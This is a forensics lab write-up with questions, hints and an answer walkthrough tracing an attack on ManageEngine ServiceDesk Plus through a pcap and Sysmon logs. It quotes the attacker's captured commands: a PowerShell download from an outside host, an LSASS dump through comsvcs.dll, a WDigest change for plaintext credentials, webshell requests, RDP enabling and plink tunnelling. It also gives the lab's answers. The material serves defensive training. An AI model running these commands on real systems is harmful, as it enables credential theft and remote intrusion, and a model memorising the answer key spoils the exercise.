# Still Unpatched?
#### Category:
`Endpoint Forensics` `Network Forensics`

# Difficulty:
`Easy`

#### Tags:
`sysmon` `wireshark` `cyberchef` `mimikatz` `T1003` `T1012` `T1572 ` `T1505.003` `T1021.001` `T1112`


#### Instructions:
- Uncompress the lab (pass: cyberdefenders.org)


#### Scenario:
The HR manager, faced a critical security breach when his laptop became the entry point for a cyberattack due to unpatched software. The attack is done by exploiting a vulnerability in one of his software, allowing the attacker to drop malicious files and gain access to the system.

#### Tools
- Wireshark
- Event Viewer or LogViewPlus
- CyberChef
- mimikatz

<hr>

# Questions:

#### Q1: The attacker started the attack by sending a modified http request. What was the target URL used to apply the exploit?
```
/*******/*****************?****=*
```

#### Q2: What Programming Language was the Exploit written in and the library used and it's version?
```
******-********/*.**.*
```

#### Q3: To exploit the vulnerability the attacker Uploaded a Malicious File. What is the name of that file?
```
*******.***
```

#### Q4: What is the name of the Vulnerable Software that have been Exploited?
```
************ *********** ****
```

#### Q5: The Exploit consists of 2 stages, in the first stage the attacker uploads the malicious file, and in the second stage it involved initiating instalation of Site24x7 and the installation is done by executing the malicious file that have been uploaded by the attacker. What Command Used in the installation?
```
*******.*** /* ********************.*** ******=**** /**
```
> [!TIP]
> evtx time?

#### Q6: When the malicious file is executed another file is written can you tell where it is located? (Absolute Path including the filename) 
```
*:\******* ***** (***)\************\***********\******\*****\****.***
```
> [!TIP]
> 1. evtx + pcap...
> 2. maybe http?

#### Q7: What is the type of the attack that can happen using this file?
```
*** *****
```

#### Q8: Now the attacker reached to the initial access, can you tell what privilege does he has? (What User?)
```
** *********\******
```

#### Q9: What is the Authentication Method/Protocol did the Threat Actor check for?
```
*******
```

#### Q10: The Attacker Modified a registery value write the full registiry path including this value
```
****\******\*****************\*******\*****************\*******\******************
```

#### Q11: When this method is enabled. In what format are passwords stored in memory?
```
*********
```

#### Q12: What is the proccess that the attacker tried to dump?
```
LSASS
*****
```

#### Q13: What dll file did the attacker use to apply the dump?
```
comsvcs.dll
*******.***
```

#### Q14: The attacker dumped the process and wrote the dumo to a certain file, and then he downloaded it. can you tell the size of that file? (in bytes)
```
00000
*****
```

#### Q15: Did it Work? (yay, nay)
```
nay
***
```
> [!TIP]
> Based on the Size

#### Q16: The Attacker downloaded a file to the Victim's Machine can you tell from where did he download it? (<IP>:<PORT>)
```
192.168.1.2:9000
```

#### Q17: This file seems to be a calculator!!. hmm...? I think it's not a calculator. what is it? 
```
procdump.exe
********.***
```
> [!TIP]
> Invistigate the real filename

#### Q18: Another file has been downloaded from the system. What Was its Size? (in bytes)
```
54998530
********
```
#### Q19: What command did the cover his tracks?
```
Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"
```

#### Q20: In the lab files you will see a bin file which has the OS Credintials and also a password of ZIP file (the second part of the lab). What is USERNAME:PASSWORD? (DON'T CHEAT)
```
Victim:victim123
******:*********
```

#### Q22: After a while the attacker started to search for a confidential data. can you tell what was the first directory he looked at?
```
C:\Users\Victim\Pictures
*:\*****\******\********

```

#### Q23: What Did he try to steal? (filename)
```
Employees.xls
*********.***
```

#### Q25: The fun is not over yet. he decided to download another file to the victim machine. what is the name of that file at the server?
```
file.exe
****.***
```
#### Q26: Then he checked for a service status. What was it?
```
TermService
***********
```

#### Q27: After That he was hungry for more evil. He needed to ensure that they can remotely access the system. How can he access the system Remotely, what protocol does he need?
```
RDP
***
```

#### Q27: What Registery Value Did he change? (path included)
```
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections
****\******\*****************\*******\******** ******\******************
```
> [!TIP]
> evtx

#### Q28: There is a .bat file was created. Where is it? (Absolute Path including the filename)
```
C:\Users\Victim\Documents\FXS.bat
```


#### Q29: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
```
plink.exe:CC62BA67C1200202D1DA784EA0313408
*****.***:********************************
```

#### Q30: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
```
192.168.1.2:443
***.***.*.*:***
```

#### Q31: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
```
127.0.0.1:49800, 192.168.20.145:3389
ASN1, ANS2
```

#### Q32: What is the type of SSH Server that the attacker uses? (Software Name)
```
SSH-2.0-9.38 FlowSsh: Bitvise SSH Server (WinSSHD) 9.38
SSH-*.*-*.** *******:******** *** ****** (*******) *.**
```
> [!TIP]
> How many handshakes?

#### Q33: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)

```
2024-07-20 14:02
****-**-** **:**
```
> [!TIP]
> RDP Clipboard Monitor

<hr>
<br>

# Still Unpatched? Walkthrough

#### We are given a ZIP File with password "cyberdefenders.org"

![image](https://github.com/user-attachments/assets/bdd7e906-7f82-49f6-a7fd-df0870c169cd)


- We Got 4 files [1.pcap, sysmon_log.evtx, logc2.bin, 2.zip]

- After Reading the Tags and The Scenario we can understand that there is a Software that have a vulnerability and this vulnerability have been exploited. Then the attacker gained dumped some credentials `T1003` also there is a webshell  `T1505.003` and RDP `T1021.001`.

### OK, Let's See What We Got Here...
<br>

#### Q1: The attacker started the attack by sending a modified http request. What was the target URL used to apply the exploit?
```
/*******/*****************?****=*
```

- Open `1.pcap` on wireshark
- filter `http`
- Looks we got a POST request from ip `192.168.20.134` which he will probably be the attacker in this lab.
![image](https://github.com/user-attachments/assets/265a38f4-c5be-46ea-8489-87298fa78f81)
- He sent this request to `192.168.20.147` on port `8080` to /RestAPI/ImportTechnicians?step=1
##### - Answer: ```/RestAPI/ImportTechnicians?step=1```

<br>

#### Q2: What Programming Language was the Exploit written in and the library used and it's version?
```
******-********/*.**.*
```
- We can easily look at the User-Agent of the Request and Find our Answer.
![image](https://github.com/user-attachments/assets/011a6a6b-66a6-49a3-9931-ca1477e3132b)

##### - Answer: ```python-requests/2.28.1```

<br>

#### Q3: To exploit the vulnerability the attacker Uploaded a Malicious File. What is the name of that file?
```
*******.***
```
- Untill now the answer still can be found in the same packet
![image](https://github.com/user-attachments/assets/b1d7b46a-3bdd-4431-990b-52e300d5ec8c)


##### - Answer: `msiexec.exe`

<br>

#### Q4: What is the name of the Vulnerable Software that have been Exploited?
```
************ *********** ****
```
- We can look at the evtx file and find the answer or invistigate some packets.
- if looked at the response of `GET /favicon.ico` we can easily find the Answer in the HTML <title> tag. 

![image](https://github.com/user-attachments/assets/13525953-254f-421d-93bd-c3b61fa597c7)

![image](https://github.com/user-attachments/assets/ef068a20-e2ea-4e0e-a60a-dd7e6e9ffd93)


##### - Answer:  `ManageEngine ServiceDesk Plus`

<br>

#### Q5: The Exploit consists of 2 stages, in the first stage the attacker uploads the malicious file, and in the second stage it involved initiating instalation of Site24x7 and the installation is done by executing the malicious file that have been uploaded by the attacker. What Command Used in the installation?
```
*******.*** /* ********************.*** ******=**** /**
```
> [!TIP]
> evtx time?

- we can search for the `msiexec.exe` in the evtx using Event Viewer

![image](https://github.com/user-attachments/assets/42638997-3d5b-4e1d-9c54-c2d543e35b88)

- Looks like there is `C:\Program Files (x86)\ManageEngine\ServiceDesk\bin\msiexec.exe` file created by `C:\Program Files (x86)\ManageEngine\ServiceDesk\jre\bin\java.exe` 
- Keep Digging for a Command where the `msiexec.exe` file have been used.
- In the Event After the previous one, you will find `CommandLine: msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=null /qn `, which initiate the installation of Zoho’s Site24x7 performance monitoring tool.
- 
##### - Answer: `msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=null /qn`

<br>

#### Q6: When the malicious file is executed another file is written can you tell where it is located? (Absolute Path including the filename) 
```
*:\******* ***** (***)\************\***********\******\*****\****.***
```
> [!TIP]
> 1. evtx + pcap...
> 2. maybe http?

- We got two hints, we already know the path of the ManageEngine ServiceDesk `C:\Program Files (x86)\ManageEngine\ServiceDesk\`.
- Let's take a look at the pcap file. `http` filter still on.
- If follower the HTTP Requests we will find a `GET /custom/login/wbsh.jsp`. so add this to the full path we have and we got our answer. filter: `http and ip.addr==192.168.20.134`

![image](https://github.com/user-attachments/assets/299fdd15-6c6d-4b08-b052-72d894382fa9)

![image](https://github.com/user-attachments/assets/f02fe877-a222-4588-a488-0ea7a524c4cf)

##### - Answer: C:\Program Files (x86)\ManageEngine\ServiceDesk\custom\login\wbsh.jsp`

<br>

#### Q7: What is the type of the attack that can happen using this file?
```
*** *****
```
- JSP files are used for creating dynamic web content. They embed Java code within HTML to generate dynamic content on the server before sending it to the client's browser.
- We Can abuse JSP files to reach a `Web Shell`. [MORE FUN](https://www.microsoft.com/en-us/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/)

##### - Answer: `Web Shell`

<br>

#### Q8: Now the attacker reached to the initial access, can you tell what privilege does he has? (What User?)
```
** *********\******
```
- Now we know that the attacker got a Web Shell, So he will probably do some enumurations.
![Enum](https://github.com/user-attachments/assets/cab66110-798c-4f84-83b8-0d504850d3c8)
- `whoami`, `ipconfig /all`, `systeminfo`, `arp -a`, `tasklist`
- We can answer the question by looking at the response to GET custom/login/wbsh.jsp?cmd=whoami&action=exec

![image](https://github.com/user-attachments/assets/d4434a28-0a97-47e7-85ba-860b70e2f69f)

##### - Answer: `NT AUTHORITY\SYSTEM`

<br>

#### Q9: What is the Authentication Method/Protocol did the Threat Actor check for?
```
*******
```
- You can find a reg query command.

![image](https://github.com/user-attachments/assets/8444ba74-c662-4d28-ad28-6f18b2570c9d)

![image](https://github.com/user-attachments/assets/f86e36ea-d17f-4663-9351-10a970cc1b37)

- `reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential` Checks the registry to see if the `WDigest` authentication setting is configured to use UseLogonCredential.

##### - Answer: `WDigest`

<br>

#### Q10: The Attacker Modified a registery value write the full registiry path including this value
```
****\******\*****************\*******\*****************\*******\******************
```
- Almost 99% of attacker's attemps is captured in the 1.pcap file
![image](https://github.com/user-attachments/assets/aa6f4ed9-3431-4d6f-ad76-aa3d308accc6)

- `Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'` so basicallay he enabled the UserLogonCredential in WDigest now we got a Plaintext passwords in memory for the WDigest authentication protocol.
- We Can also use sysmon evtx Evemt ID 13 

![image](https://github.com/user-attachments/assets/743cdc82-6e70-44f9-be03-7bee98be0e44)


##### - Answer:  `HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`

<br>

#### Q11: When this method is enabled. In what format are passwords stored in memory?
```
*********
```

##### Answer: plaintext

<br>

#### Q12: What is the proccess that the attacker tried to dump?
```
*****
```
- Keep Digging with the HTTP Request and The Commands
- you will see `C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 652 C:\Windows\Temp\logctl.zip full`
- the attacker is trying to dumo a process with PID of `652`
- We All know that WDigest Enabled = LSASS Dump
- But Let's Walk with this, Remember the `tasklist` command in the enumuration?

![image](https://github.com/user-attachments/assets/055571f7-0af7-4458-ae1f-411d3b802f1f)

##### - Answer: LSASS

<br>

#### Q13: What dll file did the attacker use to apply the dump?
```
*******.***
```
- `C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 652 C:\Windows\Temp\logctl.zip full`
- there should be `logctl.zip` file written now to `C:\Windows\Temp\logctl.zip`

##### - Answer: comsvcs.dll

<br>

#### Q14: The attacker dumped the process and wrote the dumo to a certain file, and then he downloaded it. can you tell the size of that file? (in bytes)
```
*****
```
- The Attacker now downloaded this file using this request `GET /custom/login/wbsh.jsp?file=C:\Windows\Temp\logctl.zip&action=download`

![image](https://github.com/user-attachments/assets/4551e387-329a-43c7-9ba6-8aec6aabeab5)

- now a file transfer should occur right? let's look at the response
- Response:- Content-Length: 0, which means the file is empty and equal to 0 bytes.
![image](https://github.com/user-attachments/assets/e97ebd43-0e23-42a0-9610-47a061d12871)

##### - Answer: `00000`

<br>

#### Q15: Did it Work? (yay, nay)
```
***
```
> [!TIP]
> Based on the Size
- Empty File == No Dump == nay

##### - Answer: `nay`

<br>

#### Q16: The Attacker downloaded a file to the Victim's Machine can you tell from where did he download it? (<IP>:<PORT>)
```
***.***.*.*:****
```
- Packet no.6584 `(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')` 

#### - Answer: `192.168.1.2:9000`

<br>

#### Q17: This file seems to be a calculator!!. hmm...? I think it's not a calculator. what is it? 
```
********.***
```
> [!TIP]
> Invistigate the real filename
- 

##### - Answer: `procdump.exe`

<br>

#### Q18: Another file has been downloaded from the system. What Was its Size? (in bytes)
```
54998530
********
```
#### Q19: What command did the cover his tracks?
```
Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"
```

#### Q20: In the lab files you will see a bin file which has the OS Credintials and also a password of ZIP file (the second part of the lab). What is USERNAME:PASSWORD? (DON'T CHEAT)
```
Victim:victim123
******:*********
```

#### Q22: After a while the attacker started to search for a confidential data. can you tell what was the first directory he looked at?
```
C:\Users\Victim\Pictures
*:\*****\******\********

```

#### Q23: What Did he try to steal? (filename)
```
Employees.xls
*********.***
```

#### Q25: The fun is not over yet. he decided to download another file to the victim machine. what is the name of that file at the server?
```
file.exe
****.***
```
#### Q26: Then he checked for a service status. What was it?
```
TermService
***********
```

#### Q27: After That he was hungry for more evil. He needed to ensure that they can remotely access the system. How can he access the system Remotely, what protocol does he need?
```
RDP
***
```

#### Q27: What Registery Value Did he change? (path included)
```
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections
****\******\*****************\*******\******** ******\******************
```
> [!TIP]
> evtx

#### Q28: There is a .bat file was created. Where is it? (Absolute Path including the filename)
```
C:\Users\Victim\Documents\FXS.bat
```


#### Q29: As we noticed this hacker is smart. he never use the real filename. What is the real filename of the file he downloaded combined with its MD5 hash? <FILENAME.EXE>:MD5
```
plink.exe:CC62BA67C1200202D1DA784EA0313408
*****.***:********************************
```

#### Q30: Like you did notice this batch will be used in Establishing SSH Connection. What is the IP address of SSH Server and its Port? (<ip_addr>:<port>)
```
192.168.1.2:443
***.***.*.*:***
```

#### Q31: The actor used the technique of port forwarding to listen on the remote port: `ANS1`, and forward the requests to `ANS2`. ANS* = <ip_addr>:<port>
```
127.0.0.1:49800, 192.168.20.145:3389
ASN1, ANS2
```

#### Q32: What is the type of SSH Server that the attacker uses? (Software Name)
```
SSH-2.0-9.38 FlowSsh: Bitvise SSH Server (WinSSHD) 9.38
SSH-*.*-*.** *******:******** *** ****** (*******) *.**
```
> [!TIP]
> How many handshakes?

#### Q33: Over this SSH Connection the Attacker was able to RDP. Can you identify the timestamp of the first time ? (Y-M-D 24:00)

```
2024-07-20 14:02
****-**-** **:**
```
> [!TIP]
> RDP Clipboard Monitor

<hr>
